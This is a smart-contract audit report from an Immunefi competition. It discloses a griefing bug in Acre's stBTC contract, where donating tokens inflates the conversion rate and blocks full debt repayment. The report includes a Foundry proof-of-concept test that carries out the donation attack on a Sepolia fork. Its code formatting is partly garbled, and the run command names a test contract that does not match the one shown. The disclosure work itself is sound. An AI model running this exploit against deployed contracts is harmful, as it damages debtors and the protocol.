# #34836 \[SC-Medium] Malicious party can make it impossible for debt to be completely repaid by donati

**Submitted on Aug 28th 2024 at 19:29:25 UTC by @Dliteofficial for** [**Audit Comp | Acre**](https://immunefi.com/audit-competition/boost-acre)

* **Report ID:** #34836
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://sepolia.etherscan.io/address/0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

## Vulnerability Details

\`stBTC.sol\` is Acre's staking contract that allows user to deposit threshold btc (tbtc) in exchange for stBTC. At the pleasure of the owner address, with due diligence I would assume, an address can be granted the permission to mint stBTC without depositing tbtc into the contract. According to the NatSpec in \`stBTC::totalAssets()\`, this mechanism can also be used to balance the conversion rate between tbtc and stBTC.

However, as obtainable in the codebase, the change in conversion rate, artificial or natural, is not accounted for when the debtor tries to repay the debt in \`stBTC::repayDebt()\`. An attacker can take advantage of this, donate to the contract, effectively increasing the conversion rate. This way, when the debtor decides to repay the debt owed, they will be unable to repay because the value of the shares borrowed converted to asset is higher than what was initially borrowed when the function is expecting the original asset value.

\`\`\`solidity function repayDebt( uint256 shares ) public whenNotPaused returns (uint256 assets) { assets = convertToAssets(shares);

```
    // Check the current debt of the debtor.
```

\>>> if (currentDebt\[msg.sender] < assets) { revert ExcessiveDebtRepayment( msg.sender, currentDebt\[msg.sender], assets ); }

```
    // Decrease the debt of the debtor.
```

\>>> currentDebt\[msg.sender] -= assets;

```
    emit DebtRepaid(msg.sender, currentDebt[msg.sender], assets, shares);

    // Decrease the total debt.
```

\>>> totalDebt -= assets;

```
    // Burn the shares from the debtor.
    super._burn(msg.sender, shares);

    return shares;
}
```

\`\`\`

## Impact Details

This is purely a griefing attack. This attack is quite cheap to execute (10 wei of tbtc as shown in the POC) but the impact is quite low. The attackers stands to gain nothing. At most, the conversion rate and total assets is inflated, and the debtor is unable to completely return the borrowed shares.

## Recommendation

The code works for partial repayment, however, for full repayment, the debtor's current debt should be set to zero and totalDebt should also be set to zero if the debtor's repayment is last for all the borrowed assets.

## References

## Proof of Concept

\`\`\` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;

import { stBTC } from "contracts/stBTC.sol"; import "forge-std/Test.sol"; import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TDCDTest is Test{

```
stBTC stBTCContract;
address owner;
address debtor;
address attacker;
address tbtc &#x3D; 0x517f2982701695D4E52f1ECFBEf3ba31Df470161;

function setUp() public {
    //initialize the stBTCContract
    stBTCContract &#x3D; stBTC(0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3);
    vm.label(address(stBTCContract), &quot;stBTC Contract&quot;);

    //initialize the attacker and victim addresses
    attacker &#x3D; makeAddr(&quot;Attacker&quot;);
    vm.label(attacker, &quot;Attacker&quot;);

    debtor &#x3D; makeAddr(&quot;Debtor&quot;);
    vm.label(debtor, &quot;Debtor&quot;);

    owner &#x3D; stBTCContract.owner();
    vm.label(owner, &quot;stBTC Contract Address&quot;);

    //token minting and approvals
    deal(tbtc, attacker, 1 ether);
}

function test__TotalDebtAndCurrentDebtDuringPayBack() public {
    //owner grants debtor address allowance to mint stBTC without any deposit
    vm.startPrank(owner);
    stBTCContract.updateDebtAllowance(debtor, 1 ether);
    assertEq(stBTCContract.allowedDebt(debtor), 1 ether);

    //debtor mints the stBTC
    changePrank(debtor);
    stBTCContract.mintDebt(1 ether, debtor);
    assertEq(stBTCContract.balanceOf(debtor), 1 ether);
    
    //Attacker donates 10 wei of tbtc into stBTC Contract
    uint totalAssetBefore &#x3D; stBTCContract.totalAssets();
    changePrank(attacker);
    IERC20(tbtc).transfer(address(stBTCContract), 10);
    assertGt(stBTCContract.totalAssets(), totalAssetBefore);
    assertEq(stBTCContract.totalAssets() - totalAssetBefore, 10);

    //due to the donation, debtor is unable to completely pay back the debt
    changePrank(debtor);
    //we anticipate the code reverting
    vm.expectRevert(abi.encodeWithSelector(stBTC.ExcessiveDebtRepayment.selector, debtor, 1 ether, stBTCContract.convertToAssets(1 ether)));
    stBTCContract.repayDebt(1 ether);
}
```

} \`\`\`

Run this in your console:

\`\`\` forge test --match-contract DonationAttackTest --fork-url \<FORK-URL> --fork-block-number 6237648 -vv \`\`\`
